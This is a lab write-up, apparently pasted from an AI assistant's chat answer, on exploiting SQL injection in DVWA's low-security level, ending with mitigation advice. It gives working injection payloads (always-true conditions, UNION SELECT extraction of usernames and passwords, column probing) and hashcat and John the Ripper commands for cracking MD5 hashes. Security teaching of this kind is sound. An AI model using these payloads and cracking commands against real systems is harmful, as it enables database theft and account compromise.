# DVWA SQL Injection – Low Difficulty

## Overview
This project demonstrates a **SQL Injection vulnerability** in a web application using DVWA (Damn Vulnerable Web Application).  
The purpose of this lab is to understand how user input can be exploited in **unsanitized SQL queries** and learn proper mitigation techniques.

**Security Level:** Low  
**Target:** `user_id` GET parameter  

---

## Objective
- Exploit a SQL Injection vulnerability to retrieve **usernames and passwords** from the database.
- Understand the impact of unsanitized user input.
- Learn how to **prevent SQL Injection** using proper techniques.

---

## Vulnerability Description
The web application takes the `user_id` from the URL and directly inserts it into a SQL query:

```sql
SELECT first_name, last_name FROM users WHERE user_id = <user_input>;
````

**Issues:**

* User input is **not validated or sanitized**
* Query can be manipulated using SQL statements
* Allows attackers to access all users’ data

---

## Exploitation Steps

### 1. Test Vulnerability

Enter a single quote `'` as `user_id`:

```
?id='
```

* If an **SQL syntax error** appears, the input is vulnerable.

### 2. Bypass with Always-True Condition

Use input:

```
?id=1 OR 1=1
```

* Returns **all users** because `1=1` is always true.

### 3. Extract Usernames and Passwords

Use UNION query:

```
?id=1 UNION SELECT user, password FROM users
```

* Combines results from the `users` table.
* Displays all usernames and hashed passwords.

### 4. Optional: Identify Number of Columns

```sql
ORDER BY 1; -- works
ORDER BY 2; -- works
ORDER BY 3; -- error
```

* Confirms **2 columns** exist.

---

## Example Payloads

| Purpose                     | Payload                                    |
| --------------------------- | ------------------------------------------ |
| Always true condition       | `1 OR 1=1`                                 |
| Extract usernames/passwords | `1 UNION SELECT user, password FROM users` |
| Test number of columns      | `1 ORDER BY 1`                             |

---

## Cracking Password Hashes

If passwords are **hashed** (MD5 in DVWA), you can use:

### Online

* CrackStation: [https://crackstation.net](https://crackstation.net)

### Local Tools

* **Hashcat**

```bash
hashcat -m 0 hashes.txt wordlist.txt
```

* **John the Ripper**

```bash
john --format=raw-md5 --wordlist=wordlist.txt hashes.txt
```

---

## Mitigation

**Prevent SQL Injection** using:

1. **Parameterized Queries / Prepared Statements**

```js
const stmt = "SELECT first_name, last_name FROM users WHERE user_id = ?";
db.query(stmt, [userInput]);
```

2. **Input Validation & Sanitization**

* Ensure input matches expected format (numeric ID, email, etc.)
* Use libraries like `validator.js` in Node.js

---

## References

* DVWA Official: [http://www.dvwa.co.uk/](http://www.dvwa.co.uk/)
* PortSwigger SQL Injection Cheat Sheet: [https://portswigger.net/web-security/sql-injection](https://portswigger.net/web-security/sql-injection)
* OWASP SQL Injection Guide: [https://owasp.org/www-community/attacks/SQL\_Injection](https://owasp.org/www-community/attacks/SQL_Injection)

---

**Author:** Ammad Aziz
**Date:** 2025

```

I can also make a **full project folder with `index.php`, `database.sql`, and this README.md` ready for testing DVWA low SQLi lab** if you want.  

Do you want me to do that next?
```
